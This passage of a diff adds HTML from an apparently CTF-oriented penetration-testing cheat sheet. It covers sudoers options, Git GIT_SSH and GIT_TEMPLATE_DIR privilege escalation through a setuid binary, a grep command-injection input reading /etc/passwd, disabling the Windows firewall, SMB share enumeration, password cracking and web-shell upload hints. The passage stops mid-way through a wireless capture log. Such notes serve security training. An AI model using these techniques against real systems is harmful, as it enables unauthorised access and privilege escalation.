+<h3>hostname<a class="headerlink" href="#hostname" title="Link to this heading"></a></h3>
+<p>We can also check the ipaddress of the host using hostname command</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hostname</span> <span class="o">-</span><span class="n">I</span>
+<span class="mf">172.17.0.1</span> <span class="mf">14.97.194.148</span>
+</pre></div>
+</div>
+</section>
+<section id="ss">
+<h3>ss<a class="headerlink" href="#ss" title="Link to this heading"></a></h3>
+<p>ss - another utility to investigate sockets</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ss</span>
+
+      <span class="o">-</span><span class="n">n</span><span class="p">,</span> <span class="o">--</span><span class="n">numeric</span>
+             <span class="n">Do</span> <span class="ow">not</span> <span class="k">try</span> <span class="n">to</span> <span class="n">resolve</span> <span class="n">service</span> <span class="n">names</span><span class="o">.</span>
+    <span class="o">-</span><span class="n">l</span><span class="p">,</span> <span class="o">--</span><span class="n">listening</span>
+             <span class="n">Display</span> <span class="n">only</span> <span class="n">listening</span> <span class="n">sockets</span> <span class="p">(</span><span class="n">these</span> <span class="n">are</span> <span class="n">omitted</span> <span class="n">by</span> <span class="n">default</span><span class="p">)</span><span class="o">.</span>
+      <span class="o">-</span><span class="n">t</span><span class="p">,</span> <span class="o">--</span><span class="n">tcp</span>
+             <span class="n">Display</span> <span class="n">TCP</span> <span class="n">sockets</span><span class="o">.</span>
+
+      <span class="o">-</span><span class="n">u</span><span class="p">,</span> <span class="o">--</span><span class="n">udp</span>
+             <span class="n">Display</span> <span class="n">UDP</span> <span class="n">sockets</span><span class="o">.</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="user-home-directory">
+<h2>User Home Directory<a class="headerlink" href="#user-home-directory" title="Link to this heading"></a></h2>
+<p>If we find that home directory contains</p>
+<section id="firefox-thunderbird-seabird">
+<h3>Firefox/ Thunderbird/ Seabird<a class="headerlink" href="#firefox-thunderbird-seabird" title="Link to this heading"></a></h3>
+<p>We can utilize <a class="reference external" href="https://github.com/unode/firefox_decrypt">Firefox Decrypt</a> is a tool to extract passwords from Mozilla (Firefox/ Thunderbird/ Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.</p>
+</section>
+</section>
+<section id="sudoers-file">
+<h2>Sudoers file<a class="headerlink" href="#sudoers-file" title="Link to this heading"></a></h2>
+<p>If the sudoers file contains:</p>
+<section id="secure-path">
+<h3>secure_path<a class="headerlink" href="#secure-path" title="Link to this heading"></a></h3>
+<p>Path used for every command run from sudo. If you don’t trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.</p>
+</section>
+<section id="env-reset">
+<h3>env_reset<a class="headerlink" href="#env-reset" title="Link to this heading"></a></h3>
+<p>If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller’s environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.</p>
+</section>
+<section id="mail-badpass">
+<h3>mail_badpass<a class="headerlink" href="#mail-badpass" title="Link to this heading"></a></h3>
+<p>Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.</p>
+</section>
+</section>
+<section id="run-parts">
+<h2>run-parts<a class="headerlink" href="#run-parts" title="Link to this heading"></a></h2>
+<p>run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">run</span><span class="o">-</span><span class="n">parts</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">.</span><span class="n">daily</span>
+</pre></div>
+</div>
+</section>
+<section id="java-keystore-file">
+<h2>Java keystore file<a class="headerlink" href="#java-keystore-file" title="Link to this heading"></a></h2>
+<p>Refer <a class="reference external" href="https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores">Java Keytool essentials working with java keystores</a> and <a class="reference external" href="https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats">openssl essentials working with ssl certificates private keys and csrs</a></p>
+</section>
+<section id="cracking-md5-hashes">
+<h2>Cracking MD5 Hashes<a class="headerlink" href="#cracking-md5-hashes" title="Link to this heading"></a></h2>
+<p>Try <a class="reference external" href="https://crackstation.net/">Crackstation</a> or <a class="reference external" href="https://isc.sans.edu/tools/reversehash.html">ISC Reverse hash</a></p>
+</section>
+<section id="steghide">
+<h2>Steghide<a class="headerlink" href="#steghide" title="Link to this heading"></a></h2>
+<p>Looking for hidden text in the images? Utilize steghide</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">steghide</span> <span class="n">version</span> <span class="mf">0.5.1</span>
+
+<span class="n">the</span> <span class="n">first</span> <span class="n">argument</span> <span class="n">must</span> <span class="n">be</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">following</span><span class="p">:</span>
+<span class="n">embed</span><span class="p">,</span> <span class="o">--</span><span class="n">embed</span>          <span class="n">embed</span> <span class="n">data</span>
+<span class="n">extract</span><span class="p">,</span> <span class="o">--</span><span class="n">extract</span>      <span class="n">extract</span> <span class="n">data</span>
+<span class="n">info</span><span class="p">,</span> <span class="o">--</span><span class="n">info</span>            <span class="n">display</span> <span class="n">information</span> <span class="n">about</span> <span class="n">a</span> <span class="n">cover</span><span class="o">-</span> <span class="ow">or</span> <span class="n">stego</span><span class="o">-</span><span class="n">file</span>
+<span class="n">info</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span>       <span class="n">display</span> <span class="n">information</span> <span class="n">about</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span>
+<span class="n">encinfo</span><span class="p">,</span> <span class="o">--</span><span class="n">encinfo</span>      <span class="n">display</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">supported</span> <span class="n">encryption</span> <span class="n">algorithms</span>
+<span class="n">version</span><span class="p">,</span> <span class="o">--</span><span class="n">version</span>      <span class="n">display</span> <span class="n">version</span> <span class="n">information</span>
+<span class="n">license</span><span class="p">,</span> <span class="o">--</span><span class="n">license</span>      <span class="n">display</span> <span class="n">steghide</span><span class="s1">&#39;s license</span>
+<span class="n">help</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">display</span> <span class="n">this</span> <span class="n">usage</span> <span class="n">information</span>
+</pre></div>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Sometimes, there is no password, so just press enter.</p>
+</div>
+</section>
+<section id="git-client-privilege-escalation">
+<h2>Git client Privilege Escalation<a class="headerlink" href="#git-client-privilege-escalation" title="Link to this heading"></a></h2>
+<p>Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer <a class="reference external" href="https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial">12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial</a></p>
+<p>In one of write-up, <a class="reference external" href="http://devloop.users.sourceforge.net/">Nicolas Surribas</a> has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.</p>
+<section id="git-ssh">
+<h3>GIT_SSH<a class="headerlink" href="#git-ssh" title="Link to this heading"></a></h3>
+<p>If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the <a class="reference external" href="mailto:username&#37;&#52;&#48;host">username<span>&#64;</span>host</a> (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span> <span class="o">&gt;</span> <span class="n">cmd</span>
+<span class="n">echo</span> <span class="s1">&#39;cp /root/flag.txt /tmp&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">cmd</span>
+<span class="n">echo</span> <span class="s1">&#39;chmod 777 /tmp/flag.txt&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">cmd</span>
+<span class="n">GIT_SSH</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span><span class="o">/</span><span class="n">cmd</span> <span class="o">./</span><span class="n">setuidbinary</span><span class="p">(</span><span class="n">utilizing</span> <span class="n">git</span> <span class="n">clone</span><span class="o">/</span> <span class="n">git</span> <span class="n">fetch</span><span class="p">)</span>
+
+<span class="ow">or</span>
+
+<span class="n">echo</span> <span class="s1">&#39;chown root:root /home/username/priv ; chmod 4755 /home/username/priv&#39;</span> <span class="o">&gt;</span> <span class="n">ssh</span>
+
+<span class="n">where</span> <span class="n">priv</span> <span class="ow">is</span> <span class="n">binary</span> <span class="n">compiled</span> <span class="kn">from</span> <span class="nn">suid.c</span>
+</pre></div>
+</div>
+<p>This basically changes the command from</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">trace</span><span class="p">:</span> <span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">:</span> <span class="n">git</span> <span class="s1">&#39;clone&#39;</span> <span class="s1">&#39;ssh://root@machine-dev:/root/secret-project&#39;</span> <span class="s1">&#39;/mnt/secret-project/&#39;</span>
+</pre></div>
+</div>
+<p>to</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">trace</span><span class="p">:</span> <span class="n">run_command</span><span class="p">:</span> <span class="s1">&#39;/home/user/ssh&#39;</span> <span class="s1">&#39;root@machine-dev&#39;</span> <span class="s1">&#39;git-upload-pack &#39;</span>\<span class="s1">&#39;&#39;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">secret</span><span class="o">-</span><span class="n">project</span><span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="git-template-dir">
+<h3>GIT_TEMPLATE_DIR<a class="headerlink" href="#git-template-dir" title="Link to this heading"></a></h3>
+<p>Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer <a class="reference external" href="https://git-scm.com/docs/git-init">Git-init</a></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cp</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">git</span><span class="o">-</span><span class="n">core</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span> <span class="n">mytemplates</span>
+<span class="n">cd</span> <span class="n">mytemplates</span><span class="o">/</span><span class="n">hooks</span>
+<span class="n">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span> <span class="o">&gt;</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
+<span class="n">echo</span> <span class="s1">&#39;cp /root/flag /tmp/flag2&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
+<span class="n">echo</span> <span class="s1">&#39;chown username.username /tmp/flag2&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
+<span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
+<span class="n">cd</span> <span class="o">../..</span>
+<span class="n">GIT_TEMPLATE_DIR</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span><span class="o">/</span><span class="n">mytemplates</span><span class="o">/</span> <span class="o">./</span><span class="n">setuidbinary</span><span class="p">(</span> <span class="n">utilizing</span> <span class="n">git</span> <span class="n">clone</span><span class="o">/</span> <span class="n">git</span> <span class="n">fetch</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="metasploit-shell-upgrade">
+<h2>Metasploit shell upgrade<a class="headerlink" href="#metasploit-shell-upgrade" title="Link to this heading"></a></h2>
+<p>In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sessions</span> <span class="o">-</span><span class="n">h</span>
+<span class="n">Usage</span><span class="p">:</span> <span class="n">sessions</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span>
+
+<span class="n">Active</span> <span class="n">session</span> <span class="n">manipulation</span> <span class="ow">and</span> <span class="n">interaction</span><span class="o">.</span>
+
+<span class="n">OPTIONS</span><span class="p">:</span>
+
+<span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="n">opt</span><span class="o">&gt;</span>  <span class="n">Upgrade</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">to</span> <span class="n">a</span> <span class="n">meterpreter</span> <span class="n">session</span> <span class="n">on</span> <span class="n">many</span> <span class="n">platforms</span>
+</pre></div>
+</div>
+</section>
+<section id="truecrypt-files">
+<h2>Truecrypt Files<a class="headerlink" href="#truecrypt-files" title="Link to this heading"></a></h2>
+<p>If you have a truecrypt volume to open and crack it’s password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">truecrack</span> <span class="o">--</span><span class="n">truecrypt</span> <span class="o">&lt;</span><span class="n">Truecrypt</span> <span class="n">File</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">k</span> <span class="n">SHA512</span> <span class="o">-</span><span class="n">w</span> <span class="o">&lt;</span><span class="n">Wordlist_File</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>and Veracrypt or cryptsetup to open the file.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cryptsetup</span> <span class="nb">open</span> <span class="o">--</span><span class="nb">type</span> <span class="n">tcrypt</span> <span class="o">&lt;</span><span class="n">Truecrypt</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">MountName</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+</section>
+<section id="grep-in-input-box">
+<h2>Grep in input box?<a class="headerlink" href="#grep-in-input-box" title="Link to this heading"></a></h2>
+<ul>
+<li><p>If the html code contains the below where $key is the input from the user, and we want to read a particular value</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span> <span class="n">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i $key dictionary.txt&quot;</span><span class="p">);</span>
+
+<span class="n">Remember</span> <span class="n">grep</span> <span class="n">works</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">way</span> <span class="s2">&quot;grep bitvijays /etc/passwd&quot;</span> <span class="ow">is</span> <span class="n">find</span> <span class="n">bitvijays</span> <span class="ow">in</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="o">.</span> <span class="n">This</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="ow">in</span> <span class="n">reading</span> <span class="n">some</span> <span class="n">files</span> <span class="n">on</span> <span class="n">the</span> <span class="n">disk</span><span class="o">.</span>
+</pre></div>
+</div>
+</li>
+<li><p>If the above contains</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>if(preg_match(&#39;/[;|&amp;]/&#39;,$key)) {
+     print &quot;Input contains an illegal character!&quot;;
+     } else {
+     passthru(&quot;grep -i $key dictionary.txt&quot;);
+ }
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div><p>Here we can use “.* /etc/passwd #”</p>
+<p>This command searches for any character in the file and comments out the reference to dictionary.txt</p>
+</div></blockquote>
+</section>
+<section id="id9">
+<h2>Others<a class="headerlink" href="#id9" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>While downloading files from FTP, make sure that you have set the mode to binary, otherwise downloaded files could be corrupted.</p></li>
+<li><p>It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.</p></li>
+<li><p>If there’s a RCE in some web-application, probably, one of the way to check RCE is to ping your own machine.</p></li>
+<li><p>If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article)https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/</p></li>
+<li><p>Identification of OS:</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">os</span><span class="o">-</span><span class="n">release</span>
+
+<span class="n">NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu&quot;</span> <span class="n">VERSION</span><span class="o">=</span><span class="s2">&quot;16.04 LTS (Xenial Xerus)&quot;</span> <span class="n">ID</span><span class="o">=</span><span class="n">ubuntu</span>
+<span class="n">ID</span>\<span class="n">_LIKE</span><span class="o">=</span><span class="n">debian</span> <span class="n">PRETTY</span>\<span class="n">_NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu 16.04 LTS&quot;</span> <span class="n">VERSION</span>\<span class="n">_ID</span><span class="o">=</span><span class="s2">&quot;16.04&quot;</span>
+<span class="n">HOME</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">&quot;http://www.ubuntu.com/&quot;</span>
+<span class="n">SUPPORT</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">&quot;http://help.ubuntu.com/&quot;</span>
+<span class="n">BUG</span>\<span class="n">_REPORT</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">&quot;http://bugs.launchpad.net/ubuntu/&quot;</span>
+<span class="n">UBUNTU</span>\<span class="n">_CODENAME</span><span class="o">=</span><span class="n">xenial</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>Many times if IPv6 is enabled, probably you can utilize IPv6 to connect and bypass firewall restrictions ( If firewall is not implemented at IPv6 level - many times it is not ).</p></li>
+</ul>
+<blockquote>
+<div><ul class="simple">
+<li><p>To find IPv6 from SNMP</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">snmpwalk</span> <span class="o">-</span><span class="n">v2c</span> <span class="o">-</span><span class="n">c</span> <span class="n">public</span> <span class="n">prism</span> <span class="mf">1.3.6.1.2.1.4.34.1.3</span>
+<span class="n">iso</span><span class="mf">.3.6.1.2.1.4.34.1.3.2.48.1.0.0.0.0.0.0.0.0.0.0.0.0.0.1</span> <span class="o">=</span> <span class="n">INTEGER</span><span class="p">:</span> <span class="mi">335544320</span>
+<span class="n">iso</span><span class="mf">.3.6.1.2.1.4.34.1.3.2.48.2.0.0.0.0.0.0.0.0.0.0.0.0.0.1</span> <span class="o">=</span> <span class="n">INTEGER</span><span class="p">:</span> <span class="mi">335544321</span>
+<span class="n">iso</span><span class="mf">.3.6.1.2.1.4.34.1.3.2.48.2.18.52.86.120.171.205.0.0.0.0.0.0.0.1</span> <span class="o">=</span> <span class="n">INTEGER</span><span class="p">:</span> <span class="mi">335544323</span>
+</pre></div>
+</div>
+<p>Now, convert the decimal value after “iso.3.6.1.2.1.4.34.1.3.2” to hex which would be your IPv6 address “3002:1234:5678:ABCD::1”</p>
+</div></blockquote>
+<div class="admonition-todo admonition" id="id10">
+<p class="admonition-title">Todo</p>
+<p>Mention examples for IPv6 connect</p>
+</div>
+</div></blockquote>
+<ul>
+<li><p>Disable windows firewall</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">netsh</span> <span class="n">firewall</span> <span class="nb">set</span> <span class="n">opmode</span> <span class="n">disable</span>
+</pre></div>
+</div>
+</li>
+<li><p>Port 139 Open</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>smbclient -N -L 192.168.1.2 WARNING: The &quot;syslog&quot; option is deprecated
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+kathy           Disk      Fred, What are we doing here?
+tmp             Disk      All temporary files should be stored here
+IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
+
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+
+Server               Comment
+---------            -------
+RED                  red server (Samba, Ubuntu)
+
+Workgroup            Master
+---------            -------
+WORKGROUP            RED
+
+-N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password. -L\|--list This option allows you to look at what services are available on a server. You use it as smbclient
+-L host and a list should appear. The -I option may be useful if your NetBIOS names don&#39;t match your TCP/IP DNS host names or if you are trying to reach a host on another network.
+</pre></div>
+</div>
+<p>If you want to access the share you might want to type</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">smbclient</span> \\\\<span class="n">IP</span>\\<span class="n">share</span>\<span class="n">_name</span>
+</pre></div>
+</div>
+<p>So, in the above example, it would be</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">smbclient</span> \\\\<span class="mf">192.168.1.2</span>\\<span class="n">kathy</span>
+</pre></div>
+</div>
+<p>If port 139 is open, also run enum4linux, may be it would help get the user list</p>
+</div></blockquote>
+<ul>
+<li><p>Port 69 UDP:</p>
+<p>TFTP</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">get</span> <span class="ow">or</span> <span class="n">put</span> <span class="n">file</span>
+</pre></div>
+</div>
+</li>
+<li><p>Want to see what firewall rules are applied in Linux? Get /etc/iptables/rules.v4 and /etc/iptables/rules.v6 file.</p></li>
+<li><p>Ruby Best way to get quoted words / phrases out of the text</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">text</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="o">/</span><span class="s2">&quot;([^&quot;</span><span class="p">]</span>\<span class="o">*</span><span class="p">)</span><span class="s2">&quot;/)</span>
+</pre></div>
+</div>
+</li>
+<li><p>Convert all text in a file from UPPER to lowercase</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tr</span> <span class="s1">&#39;[:upper:]&#39;</span> <span class="s1">&#39;[:lower:]&#39;</span> <span class="o">&lt;</span> <span class="nb">input</span><span class="o">.</span><span class="n">txt</span> <span class="o">&gt;</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+</li>
+<li><p>Remove lines longer than x or shorter than x</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">awk</span> <span class="s1">&#39;length($0)&gt;x&#39;</span> <span class="n">filename</span> <span class="ow">or</span> <span class="n">awk</span> <span class="s1">&#39;length($0)</span>
+</pre></div>
+</div>
+</li>
+<li><p>Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if “Policy of Truth” is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist.</p></li>
+<li><p>Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.</p></li>
+<li><p>If a machine is running a IIS Server and we have found a way to upload a file. We can try asp web-shell or meterpreter of asp, aspx, aspx-exe executable formats from msfvenom.</p></li>
+<li><p>If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it’s a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.922176</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.922688</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.923157</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.924224</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.924736</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.925723</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.933402</span> <span class="n">Probe</span> <span class="n">Response</span> <span class="p">(</span><span class="n">community</span><span class="p">)</span> <span class="p">[</span><span class="mf">1.0</span><span class="o">*</span> <span class="mf">2.0</span><span class="o">*</span> <span class="mf">5.5</span><span class="o">*</span> <span class="mf">11.0</span><span class="o">*</span> <span class="mf">18.0</span> <span class="mf">24.0</span> <span class="mf">36.0</span> <span class="mf">54.0</span> <span class="n">Mbit</span><span class="p">]</span> <span class="n">CH</span><span class="p">:</span> <span class="mi">11</span><span class="p">,</span> <span class="n">PRIVACY</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.933908</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.934427</span> <span class="n">Clear</span><span class="o">-</span><span class="n">To</span><span class="o">-</span><span class="n">Send</span> <span class="n">RA</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="mi">3</span><span class="n">e</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
